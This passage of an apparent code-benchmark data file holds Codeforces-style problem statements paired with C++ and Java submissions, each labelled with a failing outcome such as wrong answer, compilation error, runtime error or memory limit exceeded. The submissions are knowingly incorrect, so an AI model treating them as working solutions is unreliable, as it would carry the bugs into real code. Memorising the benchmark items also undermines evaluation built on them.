\"<<k<<\" \"<<t<<\" \"<<f[j][k][t]<<\" \"<<p<<endl;\n\t\tans+=f[j][k][t]*x;\n\t}\n\tprintf(\"%.10lf\\n\",ans);\n\treturn 0;\n}\n    \t \t  \t\t    \t  \t\t\t \t\t   \t\t","description":"Valera is a coder. Recently he wrote a funny program. The pseudo code for this program is given below:\/\/input: integers x, k, pa = x;for(step = 1; step &lt;= k; step = step + 1){    rnd = [random integer from 1 to 100];    if(rnd &lt;= p)        a = a * 2;    else        a = a + 1;}s = 0;while(remainder after dividing a by 2 equals 0){    a = a \/ 2;    s = s + 1;}Now Valera wonders: given the values x, k and p, what is the expected value of the resulting number s?","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains three integers x,\u2009k,\u2009p (1\u2009\u2264\u2009x\u2009\u2264\u2009109;\u00a01\u2009\u2264\u2009k\u2009\u2264\u2009200;\u00a00\u2009\u2264\u2009p\u2009\u2264\u2009100).","output_spec":"Print the required expected value. Your answer will be considered correct if the absolute or relative error doesn't exceed 10\u2009-\u20096.","notes":"NoteIf the concept of expected value is new to you, you can read about it by the link: http:\/\/en.wikipedia.org\/wiki\/Expected_value","sample_inputs":["1 1 50","5 3 0","5 3 25"],"sample_outputs":["1.0000000000000","3.0000000000000","1.9218750000000"]}
{"difficulty":2000,"lang":"GNU C++17","lang_cluster":"c++","src_uid":"cc8a8af1ba2b19bf081e379139542883","submission_id":"164856292","tags":["implementation","math"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <iostream>\n#include <vector>\n#include <algorithm>\n#include <list>\n#include <set>\n#include <map>\n#include <unordered_set>\n#include <unordered_map>\n#include <sstream>\n#include <queue>\n#include <ctime>\n#include <iomanip>\n\n#define umap unordered_map\n#define uset unordered_set\n\n#define forn(i,n) for(int i=0;i<(int)n;i++)\n#define rforn(i,n) for(int i=(int)n;i>=0;i--)\n#define forin(i,x,y) for(ll i=x;i<=(ll)y;i++)\n#define fora(itr,ctr) for(auto itr=ctr.begin();itr!=ctr.end();itr++)\n\t\nusing namespace std;\nclock_t BT=clock();\nstringstream ss;\n\n#define ll long long\nconst ll MAX=1e5+1;\n\nbool solve (ll u1,ll u2,ll u3,ll v1,ll v2,ll v3) {\n\tu2-=u1,v2-=v1;\n\tll md=u3*u3+v3*v3;\n\tll u4=u3,v4=-v3;\n\t\n\tll x=u2*u4-v2*v4,y=u2*v4+v2*u4;\n\/\/\tcout<<u2<<\" \"<<v2<<\"     \"<<u4<<\" \"<<v4<<\"    \"<<x<<\" \"<<y<<endl;\n\tif(md==0) {if(x==0 && y==0) return true;}\n\telse {\n\t\tif(x%md==0 && y%md==0) return true;\n\t}\n\treturn false;\n}\n\n\nint main()\n{\n\/\/\tfreopen(\"F:\\\\code\\\\competitive\\\\codelite\\\\cc\\\\cc++\\\\input.txt\",\"r\",stdin);\n\/\/\tfreopen(\"F:\\\\code\\\\competitive\\\\codelite\\\\cc\\\\cc++\\\\output.txt\",\"w\",stdout);\n\t\n\tios_base::sync_with_stdio(false);\n\tss<<setprecision(17);\n\tll u1,u2,u3,v1,v2,v3;\n\tcin>>u1>>v1>>u2>>v2>>u3>>v3;\n\tbool b=solve(u1,u2,u3,v1,v2,v3);\n\/\/\tcout<<b<<endl;\n\tforn(i,3) {\n\t\tswap(u1,v1),u1=-u1;\n\t\tb|=solve(u1,u2,u3,v1,v2,v3);\n\/\/\t\tcout<<b<<endl;\n\t}\n\tif(b) ss<<\"YES\"<<endl;\n\telse ss<<\"NO\"<<endl;\n\tcout<<ss.str()<<endl;\n\tclock_t CT=clock()-BT;\n\/\/\tcout<<((double)CT\/CLOCKS_PER_SEC)<<endl;\n\treturn 0;\n}\n","description":"At a geometry lesson Gerald was given a task: to get vector B out of vector A. Besides, the teacher permitted him to perform the following operations with vector \u0410: Turn the vector by 90 degrees clockwise. Add to the vector a certain vector C.Operations could be performed in any order any number of times.Can Gerald cope with the task?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integers x1 \u0438 y1 \u2014 the coordinates of the vector A (\u2009-\u2009108\u2009\u2264\u2009x1,\u2009y1\u2009\u2264\u2009108). The second and the third line contain in the similar manner vectors B and C (their coordinates are integers; their absolute value does not exceed 108).","output_spec":"Print \"YES\" (without the quotes) if it is possible to get vector B using the given operations. Otherwise print \"NO\" (without the quotes).","notes":null,"sample_inputs":["0 0\n1 1\n0 1","0 0\n1 1\n1 1","0 0\n1 1\n2 2"],"sample_outputs":["YES","YES","NO"]}
{"difficulty":2600,"lang":"GNU C++17","lang_cluster":"c++","src_uid":"cec0f6c267fa76191a3784b08e39acd6","submission_id":"re_752","tags":["dp","number theory","math"],"exec_outcome":"WRONG_ANSWER","source_code":"#ifdef DEBUG\n#define _GLIBCXX_DEBUG\n#endif\n\/\/#pragma GCC optimize(\"O3\")\n#include <bits\/stdc++.h>\nusing namespace std;\ntypedef long double ld;\ntypedef long long ll;\nll n;\nint k;\nconst int maxN = 105;\nint a[maxN];\nconst int maxP = 6324554 + 100;\nll who[maxP];\nint cnt[maxP];\nint main() {\n    ios_base::sync_with_stdio(false);\n    cin.tie(nullptr);\n\/\/    freopen(\"input.txt\", \"r\", stdin);\n    cin >> n;\n    cin >> k;\n    for (int i = 1; i <= k; i++) {\n        cin >> a[i];\n        if (a[i] == 1) {\n            cout << 0;\n            return 0;\n        }\n    }\n    sort(a + 1, a + k + 1);\n    reverse(a + 1, a + k + 1);\n    ll l = 1;\n    int sz = 0;\n    while (l <= n) {\n        who[++sz] = n \/ l;\n        l = (n \/ (n \/ l)) + 1;\n    }\n    reverse(who + 1, who + sz + 1);\n    assert(sz < maxP);\n    cnt[sz] = 1;\n    \/\/ -=\n    for (int i = 1; i <= k; i++) {\n        int ptr = 1;\n        for (int j = 1; j <= sz; j++) {\n            if (cnt[j] == 0) continue;\n            if (who[j] < a[i]) continue;\n            while (who[ptr + 1] * a[i] <= who[j]) ptr++;\n            cnt[ptr] -= cnt[j];\n        }\n    }\n    ll ans = 0;\n    for (int i = 1; i <= sz; i++) {\n        ans += who[i] * cnt[i];\n    }\n    cout << ans;\n    return 0;\n}","description":"Igor K. very much likes a multiplayer role playing game WineAge II. Who knows, perhaps, that might be the reason for his poor performance at the university. As any person who plays the game, he is interested in equipping his hero with as good weapon and outfit as possible. One day, as he was reading the game's forum yet again, he discovered a very interesting fact. As it turns out, each weapon in the game is characterised with k different numbers: a1,\u2009...,\u2009ak. They are called hit indicators and according to the game developers' plan they are pairwise coprime. The damage that is inflicted during a hit depends not only on the weapon's characteristics, but also on the hero's strength parameter. Thus, if the hero's strength equals n, than the inflicted damage will be calculated as the number of numbers on the segment , that aren't divisible by any hit indicator ai.Recently, having fulfilled another quest, Igor K. found a new Lostborn sword. He wants to know how much damage he will inflict upon his enemies if he uses it.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers: n and k (1\u2009\u2264\u2009n\u2009\u2264\u20091013, 1\u2009\u2264\u2009k\u2009\u2264\u2009100). They are the indicator of Igor K's hero's strength and the number of hit indicators. The next line contains space-separated k integers ai (1\u2009\u2264\u2009ai\u2009\u2264\u20091000). They are Lostborn sword's hit indicators. The given k numbers are pairwise coprime.","output_spec":"Print the single number \u2014 the damage that will be inflicted by Igor K.'s hero when he uses his new weapon.  Please, do not use the %lld specificator to read or write 64-bit integers in C++. It is preferred to use the cin, cout streams or the %I64d specificator.","notes":null,"sample_inputs":["20 3\n2 3 5","50 2\n15 8"],"sample_outputs":["6","41"]}
{"difficulty":1600,"lang":"GNU C++17","lang_cluster":"c++","src_uid":"d37dde5841116352c9b37538631d0b15","submission_id":"215718747","tags":["math","number+theory"],"exec_outcome":"COMPILATION_ERROR","source_code":"#include<bits\\stdc++.h>\r\nusing namespace std;\r\n\r\nint main(){\r\n    int l, r, x, y; cin >> l >> r >> x >> y;\r\n    int n = x * y;\r\n    int ans = 0;\r\n    set <int> del;\r\n    for (int i = 1; i < (int) sqrt(n) + 1; i++) { \r\n        if (n % i == 0 and i * i != n) del.insert(i); del.insert(n \/ i);\r\n        if (n % i == 0 and i * i == n) del.insert(i);\r\n    }for (auto d : del) {\r\n        if ( __gcd(d, n \/ d) == x and d * (n \/ d) \/ x == n and d >= l and d <= r and n \/ d >= l and n \/ d <= r) {\r\n            ans++;\r\n        }\r\n    }cout << ans;\r\n}","description":"Today on Informatics class Nastya learned about GCD and LCM (see links below). Nastya is very intelligent, so she solved all the tasks momentarily and now suggests you to solve one of them as well.We define a pair of integers (a,\u2009b) good, if GCD(a,\u2009b)\u2009=\u2009x and LCM(a,\u2009b)\u2009=\u2009y, where GCD(a,\u2009b) denotes the greatest common divisor of a and b, and LCM(a,\u2009b) denotes the least common multiple of a and b.You are given two integers x and y. You are to find the number of good pairs of integers (a,\u2009b) such that l\u2009\u2264\u2009a,\u2009b\u2009\u2264\u2009r. Note that pairs (a,\u2009b) and (b,\u2009a) are considered different if a\u2009\u2260\u2009b.","input_from":"standard input","output_to":"standard output","input_spec":"The only line contains four integers l,\u2009r,\u2009x,\u2009y (1\u2009\u2264\u2009l\u2009\u2264\u2009r\u2009\u2264\u2009109, 1\u2009\u2264\u2009x\u2009\u2264\u2009y\u2009\u2264\u2009109).","output_spec":"In the only line print the only integer\u00a0\u2014 the answer for the problem.","notes":"NoteIn the first example there are two suitable good pairs of integers (a,\u2009b): (1,\u20092) and (2,\u20091).In the second example there are four suitable good pairs of integers (a,\u2009b): (1,\u200912), (12,\u20091), (3,\u20094) and (4,\u20093).In the third example there are good pairs of integers, for example, (3,\u200930), but none of them fits the condition l\u2009\u2264\u2009a,\u2009b\u2009\u2264\u2009r.","sample_inputs":["1 2 1 2","1 12 1 12","50 100 3 30"],"sample_outputs":["2","4","0"]}
{"difficulty":2400,"lang":"GNU C++","lang_cluster":"c++","src_uid":"ecda878d924325789dc05035e4f4bbe0","submission_id":"re_290","tags":["binary search","ternary search","math"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <iostream>\n#include <vector>\n#include <string>\n#include <cmath>\n#include <queue>\n#include <algorithm>\n\n#define fii(x,y) for(int i=x;i<y;i++)\n#define fjj(x,y) for(int j=x;j<y;j++)\n#define fkk(x,y) for(int k=x;k<y;k++)\n#define fi(x) fii(0,x)\n#define fj(x) fjj(0,x)\n#define fk(x) fkk(0,x)\n#define eps 0.0000000001\n#define inf 1<<28\n\nusing namespace std;\n\ntypedef long long ll;\ntypedef vector <int> VI;\ntypedef vector <VI> VVI;\ntypedef vector <VVI> VVVI;\ntypedef vector <ll> VL;\ntypedef vector <VL> VVL;\ntypedef vector <double> VD;\ntypedef vector <VD> VVD;\ntypedef vector <bool> VB;\ntypedef vector <VB> VVB;\ntypedef queue <int> QI;\ntypedef pair<int,int> PI;\ntypedef pair<int,PI> PT;\ntypedef queue<PI> QPI;\ntypedef priority_queue<PT> QPT;\ntypedef pair<double,double> PD;\n\n\nint main()\n{\n    int n;\n    cin >> n;\n    VL v (n);\n    fi (n) cin >> v[i];\n    sort(v.begin(),v.end());\n    \n    VL sum (n+1,0);\n    fii (1,n+1) sum[i] = sum[i-1] + v[i-1];\n    \n    double ans = 0;\n    int med = 0;\n    int tam = 0;\n    fi (n) \n    {\n        ll tmax = min(i, n-1-i);\n        ll tmin = 0;\n        while (tmax - tmin > 5)\n        {\n            ll v1 = (2 * tmin + tmax) \/ 3;\n            ll v2 = (tmin + 2 * tmax) \/ 3;\n            ll val1 = sum[i+1] - sum[i-v1] + sum[n] - sum[n-v1];\n            ll val2 = sum[i+1] - sum[i-v2] + sum[n] - sum[n-v2];\n            if (val1 > val2) tmax = v2;\n            else tmin = v1;\n        }\n        fjj (tmin, tmax+1)\n        {\n            ll val = sum[i+1] - sum[i-j] + sum[n] - sum[n-j];\n            double cand = double(val)\/double(2*j+1) - v[i];\n            if (cand > ans)\n            {\n                ans = cand;\n                med = i;\n                tam = j;\n            }\n        }\n    }\n    cout << 2 * tam + 1 << endl;\n    bool prim = true;\n    fi(tam)\n    {\n        if (prim)\n            prim = false;\n        else\n            cout << \" \";\n        cout << v[med-tam+i];\n    }\n    \n    if (prim)\n        prim = false;\n    else\n        cout << \" \";\n    cout << v[med];\n    fi(tam)\n    {\n        cout << \" \" << v[n-tam+i];\n    }\n    cout << endl;\n}","description":"Define the simple skewness of a collection of numbers to be the collection's mean minus its median. You are given a list of n (not necessarily distinct) integers. Find the non-empty subset (with repetition) with the maximum simple skewness.The mean of a collection is the average of its elements. The median of a collection is its middle element when all of its elements are sorted, or the average of its two middle elements if it has even size.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009200 000)\u00a0\u2014 the number of elements in the list. The second line contains n integers xi (0\u2009\u2264\u2009xi\u2009\u2264\u20091\u2009000\u2009000)\u00a0\u2014 the ith element of the list.","output_spec":"In the first line, print a single integer k\u00a0\u2014 the size of the subset. In the second line, print k integers\u00a0\u2014 the elements of the subset in any order. If there are multiple optimal subsets, print any.","notes":"NoteIn the first case, the optimal subset is , which has mean 5, median 2, and simple skewness of 5\u2009-\u20092\u2009=\u20093.In the second case, the optimal subset is . Note that repetition is allowed.In the last case, any subset has the same median and mean, so all have simple skewness of 0.","sample_inputs":["4\n1 2 3 12","4\n1 1 2 2","2\n1 2"],"sample_outputs":["3\n1 2 12","3\n1 1 2","2\n1 2"]}
{"difficulty":2500,"lang":"GNU C++11","lang_cluster":"c++","src_uid":"f71d1ffcea72f5b72ead3c0bcfa323f2","submission_id":"re_748","tags":["implementation","brute force"],"exec_outcome":"WRONG_ANSWER","source_code":"#include<bits\/stdc++.h>\nusing namespace std;\n#define N 10\n\nint n,MAX;\nint a[N];\nstring command[N];\n\nstring ex(int id)\n{\n\tstring _=\"eax\";\n\t_[1]+=id;\n\treturn _;\n}\nbool dfs(int pos)\n{\n\tif(pos==MAX)\n\t{\n\t\tif(a[pos]!=n) return 0;\n\t\tcout<<pos<<'\\n';\n\t\tfor(int i=0;i<pos;i++)\n\t\t\tcout<<command[i]<<'\\n';\n\t\treturn 1;\n\t}\n\tfor(int i=0;i<=pos;i++)\n\tfor(int j=1;j<=8;j<<=1)\n\t{\n\t\ta[pos+1]=a[i]*j;\n\t\tif(a[pos+1]>n) continue;\n\t\tcommand[pos]=\"lea \"+ex(pos+1)+\", [\"+(char)('0'+j)+\"*\"+ex(i)+\"]\";\n\t\tif(dfs(pos+1)) return 1;\n\t}\n\tfor(int i=0;i<=pos;i++)\n\tfor(int j=0;j<=pos;j++)\n\tfor(int k=1;k<=8;k<<=1)\n\t{\n\t\ta[pos+1]=a[i]+a[j]*k;\n\t\tif(a[pos+1]>n) continue;\n\t\tcommand[pos]=\"lea \"+ex(pos+1)+\", [\"+ex(i)+\" + \"+(char)('0'+k)+\"*\"+ex(j)+\"]\";\n\t\tif(dfs(pos+1)) return 1;\n\t}\n} \n\nint main()\n{\n\tios_base::sync_with_stdio(0);\n\t\n\tcin>>n;\n\ta[0]=1;\n\twhile(!dfs(0)) MAX++;\n\t\n\treturn 0;\n}","description":"After the Search Ultimate program that searched for strings in a text failed, Igor K. got to think: \"Why on Earth does my program work so slowly?\" As he double-checked his code, he said: \"My code contains no errors, yet I know how we will improve Search Ultimate!\" and took a large book from the shelves. The book read \"Azembler. Principally New Approach\".Having carefully thumbed through the book, Igor K. realised that, as it turns out, you can multiply the numbers dozens of times faster. \"Search Ultimate will be faster than it has ever been!\" \u2014 the fellow shouted happily and set to work.Let us now clarify what Igor's idea was. The thing is that the code that was generated by a compiler was far from perfect. Standard multiplying does work slower than with the trick the book mentioned.The Azembler language operates with 26 registers (eax, ebx, ..., ezx) and two commands:   [x] \u2014 returns the value located in the address x. For example, [eax] returns the value that was located in the address, equal to the value in the register eax.  lea x, y \u2014 assigns to the register x, indicated as the first operand, the second operand's address. Thus, for example, the \"lea ebx, [eax]\" command will write in the ebx register the content of the eax register: first the [eax] operation will be fulfilled, the result of it will be some value that lies in the address written in eax. But we do not need the value \u2014 the next operation will be lea, that will take the [eax] address, i.e., the value in the eax register, and will write it in ebx. On the first thought the second operation seems meaningless, but as it turns out, it is acceptable to write the operation as lea ecx, [eax + ebx],lea ecx, [k*eax]or evenlea ecx, [ebx + k*eax],where k = 1, 2, 4 or 8.As a result, the register ecx will be equal to the numbers eax + ebx, k*eax and ebx + k*eax correspondingly. However, such operation is fulfilled many times, dozens of times faster that the usual multiplying of numbers. And using several such operations, one can very quickly multiply some number by some other one. Of course, instead of eax, ebx and ecx you are allowed to use any registers.For example, let the eax register contain some number that we should multiply by 41. It takes us 2 lines:lea ebx, [eax + 4*eax] \/\/ now ebx = 5*eaxlea eax, [eax + 8*ebx] \/\/ now eax = eax + 8*ebx = 41*eaxIgor K. got interested in the following question: what is the minimum number of lea operations needed to multiply by the given number n and how to do it? Your task is to help him.Consider that at the initial moment of time eax contains a number that Igor K. was about to multiply by n, and the registers from ebx to ezx contain number 0. At the final moment of time the result can be located in any register.","input_from":"standard input","output_to":"standard output","input_spec":"The input data contain the only integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009255), which Igor K. is about to multiply.","output_spec":"On the first line print number p, which represents the minimum number of lea operations, needed to do that. Then print the program consisting of p commands, performing the operations. It is guaranteed that such program exists for any n from 1 to 255. Use precisely the following format of commands (here k is equal to 1, 2, 4 or 8, and x, y and z are any, even coinciding registers): lea x, [y] lea x, [y + z] lea x, [k*y] lea x, [y + k*z] Please note that extra spaces at the end of a command are unacceptable.","notes":null,"sample_inputs":["41","2","4"],"sample_outputs":["2\nlea ebx, [eax + 4*eax]\nlea ecx, [eax + 8*ebx]","1\nlea ebx, [eax + eax]","1\nlea ebx, [4*eax]"]}
{"difficulty":1600,"lang":"GNU C++11","lang_cluster":"c++","src_uid":"fbfc333ad4b0a750f654a00be84aea67","submission_id":"re_7","tags":["shortest paths","graphs"],"exec_outcome":"MEMORY_LIMIT_EXCEEDED","source_code":"#include <iostream>\n#include <cstdio>\n#include <stdlib.h>\n#include <algorithm>\n#include <limits.h>\n#include <queue>\nusing namespace std;\n\nlong long bfs(int tren, vector<vector <long long>> adj,int n){\n    vector<long long> distancia(n,0);\n    vector<int> visitado(n,0);\n    queue<int> cola;\n    cola.push(0);\n    while(!cola.empty()){\n        int v=cola.front();\n        visitado[v]=1;\n        cola.pop();\n        if(v==n-1){\n            return distancia[n-1];\n        }\n        for(int i=0;i<n;i++){\n            if(visitado[i]!=1 and adj[v][i]==tren){\n                distancia[i]=distancia[v]+1;\n                cola.push(i);\n                \n            }\n        }\n    }\n    return -1;\n}\nint main()\n{\n\tint n;\n\tlong long m;\n\tscanf(\"%d %d\\n\",&n,&m);\n\tvector<vector<long long>> adj (n,vector<long long>(n,0));\n\tfor(long long i=0;i<m;i++){\n\t    int a;\n\t    int b;\n\t    scanf(\"%d %d\\n\",&a,&b);\n\t    adj[a-1][b-1]=1;\n\t    adj[b-1][a-1]=1;\n\t}\n\tlong long resp=0;\n\tlong long r1=bfs(1,adj, n);\n\tlong long r2=bfs(0,adj, n);\n\tif(r1==-1 or r2==-1){\n\t    resp=-1;\n\t}\n\telse{\n\t    if(r1>r2){\n\t        resp=r1;\n\t    }\n\t    else{\n\t        resp=r2;\n\t    }\n\t}\n\tcout<<resp;\n}","description":"In Absurdistan, there are n towns (numbered 1 through n) and m bidirectional railways. There is also an absurdly simple road network\u00a0\u2014 for each pair of different towns x and y, there is a bidirectional road between towns x and y if and only if there is no railway between them. Travelling to a different town using one railway or one road always takes exactly one hour.A train and a bus leave town 1 at the same time. They both have the same destination, town n, and don't make any stops on the way (but they can wait in town n). The train can move only along railways and the bus can move only along roads.You've been asked to plan out routes for the vehicles; each route can use any road\/railway multiple times. One of the most important aspects to consider is safety\u00a0\u2014 in order to avoid accidents at railway crossings, the train and the bus must not arrive at the same town (except town n) simultaneously.Under these constraints, what is the minimum number of hours needed for both vehicles to reach town n (the maximum of arrival times of the bus and the train)? Note, that bus and train are not required to arrive to the town n at the same moment of time, but are allowed to do so.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains two integers n and m (2\u2009\u2264\u2009n\u2009\u2264\u2009400, 0\u2009\u2264\u2009m\u2009\u2264\u2009n(n\u2009-\u20091)\u2009\/\u20092)\u00a0\u2014 the number of towns and the number of railways respectively. Each of the next m lines contains two integers u and v, denoting a railway between towns u and v (1\u2009\u2264\u2009u,\u2009v\u2009\u2264\u2009n, u\u2009\u2260\u2009v). You may assume that there is at most one railway connecting any two towns.","output_spec":"Output one integer\u00a0\u2014 the smallest possible time of the later vehicle's arrival in town n. If it's impossible for at least one of the vehicles to reach town n, output \u2009-\u20091.","notes":"NoteIn the first sample, the train can take the route  and the bus can take the route . Note that they can arrive at town 4 at the same time.In the second sample, Absurdistan is ruled by railwaymen. There are no roads, so there's no way for the bus to reach town 4.","sample_inputs":["4 2\n1 3\n3 4","4 6\n1 2\n1 3\n1 4\n2 3\n2 4\n3 4","5 5\n4 2\n3 5\n4 5\n5 1\n1 2"],"sample_outputs":["2","-1","3"]}
{"difficulty":2000,"lang":"GNU C++17","lang_cluster":"c++","src_uid":"fc133fe6353089a0ebee08dec919f608","submission_id":"197254094","tags":["number+theory"],"exec_outcome":"WRONG_ANSWER","source_code":"#include<bits\/stdc++.h>\r\nusing namespace std;\r\n#define endl '\\n'\r\n#define ll long long\r\nint main(){\r\n\tios::sync_with_stdio(0); cin.tie(0);\r\n\tint n;\r\n\tcin>>n;\r\n\tll cnt[15];\r\n\tmemset(cnt, 0, sizeof(cnt));\r\n\tfor(int i=1; i<=n; i++){\r\n\t\tcnt[i%9]++;\r\n\t}\r\n\tll sum = 0;\r\n\tfor(int i=1; i<=9; i++){\r\n\t\tfor(int j=1; j<=9; j++){\r\n\t\t\tsum += cnt[i]*cnt[j]*cnt[(i*j)%9];\r\n\t\t}\r\n\t}\r\n\tfor(int i=1; i<=n; i++){\r\n\t\tsum -= n\/i;\r\n\t}\r\n\tcout<<sum<<endl;\r\n\treturn 0;\r\n}\r\n\r\n","description":"Not long ago Billy came across such a problem, where there were given three natural numbers A, B and C from the range [1,\u2009N], and it was asked to check whether the equation AB\u2009=\u2009C is correct. Recently Billy studied the concept of a digital root of a number. We should remind you that a digital root d(x) of the number x is the sum s(x) of all the digits of this number, if s(x)\u2009\u2264\u20099, otherwise it is d(s(x)). For example, a digital root of the number 6543 is calculated as follows: d(6543)\u2009=\u2009d(6\u2009+\u20095\u2009+\u20094\u2009+\u20093)\u2009=\u2009d(18)\u2009=\u20099. Billy has counted that the digital root of a product of numbers is equal to the digital root of the product of the factors' digital roots, i.e. d(xy)\u2009=\u2009d(d(x)d(y)). And the following solution to the problem came to his mind: to calculate the digital roots and check if this condition is met. However, Billy has doubts that this condition is sufficient. That's why he asks you to find out the amount of test examples for the given problem such that the algorithm proposed by Billy makes mistakes.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains the only number N (1\u2009\u2264\u2009N\u2009\u2264\u2009106).","output_spec":"Output one number \u2014 the amount of required A, B and C from the range [1,\u2009N].","notes":"NoteFor the first sample the required triples are (3,\u20094,\u20093) and (4,\u20093,\u20093).","sample_inputs":["4","5"],"sample_outputs":["2","6"]}
{"difficulty":1300,"lang":"Java 11","lang_cluster":"java","src_uid":"07b750dbf7f942eab80d4260103c7472","submission_id":"re_87","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.util.*;\n\/\/warm-up\npublic class Presents {\n    \n    static Set<Integer> s = new HashSet<Integer>();\n\n    static void solve(){\n        Scanner sc = new Scanner(System.in);\n        int n=sc.nextInt(), k=sc.nextInt(),NOC=sc.nextInt(),i=0,no=0;\n        while (NOC-->0) s.add(sc.nextInt());\n        while (++i<=n) if (s.contains(i)||i%k==0) no++;\n        System.out.println(no);\n        sc.close();\n    }\n\n    public static void main(String args[]) {\n        solve();\n    }\n\n}   \n","description":"The Hedgehog likes to give presents to his friend, but no less he likes to receive them.Having received another present today, the Hedgehog suddenly understood that he has no place to put it as there was no room left on the special shelf in the cupboard. He will have to choose another shelf, but which one should he choose, how large should it be?In order to get to know this, the Hedgehog asks you to write him a program that will count the estimated number of presents that he will receive during the following N days. Besides, he is guided by the principle:   on each holiday day the Hedgehog will necessarily receive a present,  he receives presents at least every K days (i.e., if he received a present on the i-th day, he will receive the next present no later than on the i\u2009+\u2009K-th day).  For the given N and K, as well as the list of holidays among the following N days count the minimal number of presents that could be given to the Hedgehog. The number of today's day is zero, and you should regard today's present as already given (i.e., you shouldn't count it in the answer).","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integers N and K (1\u2009\u2264\u2009N\u2009\u2264\u2009365, 1\u2009\u2264\u2009K\u2009\u2264\u2009N). The second line contains a number C which represents the number of holidays (0\u2009\u2264\u2009C\u2009\u2264\u2009N). Then in the same line follow C numbers ranging from 1 to N which are the numbers of holiday days. The numbers are given in the increasing order, without repeating numbers among them.","output_spec":"Print a single number \u2014 the minimal number of presents the Hedgehog will receive over the following N days.","notes":null,"sample_inputs":["5 2\n1 3","10 1\n3 6 7 8"],"sample_outputs":["3","10"]}
{"difficulty":1200,"lang":"Java 8","lang_cluster":"java","src_uid":"1771741663a5236a0aa0551548f4aadd","submission_id":"re_1243","tags":["implementation","brute force"],"exec_outcome":"COMPILATION_ERROR","source_code":"import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport static java.lang.Integer.parseInt;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.Collections;\nimport java.util.PriorityQueue;\nimport java.util.StringTokenizer;\nimport jdk.nashorn.internal.runtime.arrays.ArrayLikeIterator;\n\npublic class B_Land_Lot {\n\n    static int a, b, n, m;\n    static int[][] grad;\n    static ArrayList<Integer> p = new ArrayList<Integer>();\n\n    public static void main(String[] args) throws IOException {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n        StringTokenizer tok = new StringTokenizer(reader.readLine());\n        n = Integer.parseInt(tok.nextToken());\n        m = parseInt(tok.nextToken());\n        grad = new int[n+1][m+1];\n        \n        for (int i = 1; i <= n; i++) {\n            tok = new StringTokenizer(reader.readLine());\n            for (int l = 1; l <= m; l++) {\n                grad[i][l] = parseInt(tok.nextToken()) + grad[i-1][l] + grad[i][l-1] - grad[i-1][l-1];\n            }\n        }\n  \n        tok = new StringTokenizer(reader.readLine());\n        a = parseInt(tok.nextToken());\n        b = parseInt(tok.nextToken());\n        int min = Integer.MAX_VALUE , value ;\n        \n       \n        for (int i = a+1; i <= n; i++) {\n            for (int j = b+1; j <= m; j++) {\n                value = grad[i][j] - grad[i-a][j] - grad[i][j-b] + grad[i-a][j-b];\n                if(value < min ){min = value;} \n            }\n        }\n         for (int i = b; i <= n; i++) {\n            for (int j = a; j <= m; j++) {\n                value = grad[i][j] - grad[i-b][j] - grad[i][j-a] + grad[i-b][j-a];\n                if(value < min ){min = value;}\n            }\n        }\n         System.out.println(min);\n    }\n}\n\n\/*\n\n\n4 5\n0 0 1 0 1\n0 1 1 1 0\n1 0 1 0 1\n1 1 1 1 1\n2 3\n\n\n3 2\n1 1\n1 1\n1 0\n2 1\n\n\n *\/\n","description":"Vasya has a beautiful garden where wonderful fruit trees grow and yield fantastic harvest every year. But lately thieves started to sneak into the garden at nights and steal the fruit too often. Vasya can\u2019t spend the nights in the garden and guard the fruit because there\u2019s no house in the garden! Vasya had been saving in for some time and finally he decided to build the house. The rest is simple: he should choose in which part of the garden to build the house. In the evening he sat at his table and drew the garden\u2019s plan. On the plan the garden is represented as a rectangular checkered field n\u2009\u00d7\u2009m in size divided into squares whose side length is 1. In some squares Vasya marked the trees growing there (one shouldn\u2019t plant the trees too close to each other that\u2019s why one square contains no more than one tree). Vasya wants to find a rectangular land lot a\u2009\u00d7\u2009b squares in size to build a house on, at that the land lot border should go along the lines of the grid that separates the squares. All the trees that grow on the building lot will have to be chopped off. Vasya loves his garden very much, so help him choose the building land lot location so that the number of chopped trees would be as little as possible.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and m (1\u2009\u2264\u2009n,\u2009m\u2009\u2264\u200950) which represent the garden location. The next n lines contain m numbers 0 or 1, which describe the garden on the scheme. The zero means that a tree doesn\u2019t grow on this square and the 1 means that there is a growing tree. The last line contains two integers a and b (1\u2009\u2264\u2009a,\u2009b\u2009\u2264\u200950). Note that Vasya can choose for building an a\u2009\u00d7\u2009b rectangle as well a b\u2009\u00d7\u2009a one, i.e. the side of the lot with the length of a can be located as parallel to the garden side with the length of n, as well as parallel to the garden side with the length of m.","output_spec":"Print the minimum number of trees that needs to be chopped off to select a land lot a\u2009\u00d7\u2009b in size to build a house on. It is guaranteed that at least one lot location can always be found, i. e. either a\u2009\u2264\u2009n and b\u2009\u2264\u2009m, or a\u2009\u2264\u2009m \u0438 b\u2009\u2264\u2009n.","notes":"NoteIn the second example the upper left square is (1,1) and the lower right is (3,2).","sample_inputs":["2 2\n1 0\n1 1\n1 1","4 5\n0 0 1 0 1\n0 1 1 1 0\n1 0 1 0 1\n1 1 1 1 1\n2 3"],"sample_outputs":["0","2"]}
